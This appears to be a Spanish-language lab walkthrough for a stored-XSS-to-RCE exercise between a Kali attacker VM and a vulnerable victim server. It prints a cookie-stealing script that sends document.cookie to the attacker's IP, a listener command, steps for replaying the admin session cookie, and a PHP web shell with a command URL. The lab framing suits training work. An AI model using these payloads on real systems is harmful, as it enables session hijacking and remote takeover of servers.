@@ -1,0 +1,68 @@
+1.	Máquinas Virtuales: Una máquina atacante (Kali Linux) y una máquina víctima (servidor vulnerable a XSS almacenado).
+	2.	Objetivo: Obtener acceso como administrador y luego ejecutar un comando remoto (RCE).
+	3.	Restricciones:
+	•	No tienes las credenciales del administrador.
+	•	No puedes utilizar scripts externos para obtener credenciales.
+	•	La máquina no es vulnerable a SQL injection.
+
+Paso 1: Exploitar la Vulnerabilidad XSS Almacenado
+
+El XSS almacenado puede ser aprovechado para robar cookies o ejecutar scripts en el contexto del usuario que ve la página. Puedes intentar inyectar un script que robe la cookie del administrador cuando visite la página del blog.
+
+Inyección de XSS
+
+	1.	Identificar un campo vulnerable en el blog: Puede ser un campo de comentarios, una entrada de formulario, etc.
+	2.	Inyectar un payload XSS:
+	•	Un ejemplo de payload para robar cookies podría ser:
+
+<script>
+  var img = new Image();
+  img.src = "http://[TU_IP]/?c=" + document.cookie;
+</script>
+
+	2.	
+	•	Sustituye [TU_IP] por la IP de tu máquina atacante.
+	3.	Iniciar un servidor en tu máquina atacante para capturar la cookie:
+
+python3 -m http.server 80
+
+
+
+Paso 2: Obtener la Cookie del Administrador
+
+Si el administrador visita la página donde inyectaste el payload, su cookie será enviada a tu servidor. Ahora, revisa los logs de tu servidor para ver la cookie capturada.
+
+Paso 3: Utilizar la Cookie para Suplantar al Administrador
+
+	1.	Capturar la cookie:
+	•	Una vez que tienes la cookie del administrador, configúrala en tu navegador para suplantar al administrador.
+	2.	Configuración de la cookie:
+	•	Usa herramientas de desarrollo del navegador (como las DevTools de Chrome o Firefox) para modificar la cookie.
+	•	Ve a la pestaña de “Application” o “Storage”, encuentra las cookies del sitio web de la víctima, y reemplaza tu cookie con la del administrador.
+
+Paso 4: Buscar el RCE
+
+Ahora que tienes acceso como administrador:
+
+	1.	Explora las funcionalidades de administrador: Busca cualquier parte del panel de administración que permita subir archivos, ejecutar comandos, etc.
+	2.	Inyectar un Payload RCE:
+	•	Si encuentras un formulario que permite subir archivos, intenta subir un archivo PHP malicioso:
+
+<?php system($_GET['cmd']); ?>
+
+	2.	
+	•	Accede al archivo subido a través del navegador:
+
+http://[IP_DE_LA_VÍCTIMA]/ruta_del_archivo_subido.php?cmd=id
+
+	2.	
+	•	Sustituye [IP_DE_LA_VÍCTIMA] y ruta_del_archivo_subido.php por la IP de la máquina víctima y la ruta correcta del archivo subido.
+	3.	Ejecutar comandos:
+	•	Puedes usar la URL anterior para ejecutar comandos arbitrarios en la máquina víctima.
+
+Resumen de Pasos
+
+	1.	Inyecta un payload XSS para capturar la cookie del administrador.
+	2.	Configura tu navegador para usar la cookie capturada.
+	3.	Explora las funcionalidades de administrador para encontrar una forma de ejecutar RCE.
+	4.	Sube un archivo PHP malicioso o encuentra otra forma de ejecutar comandos en la máquina víctima.
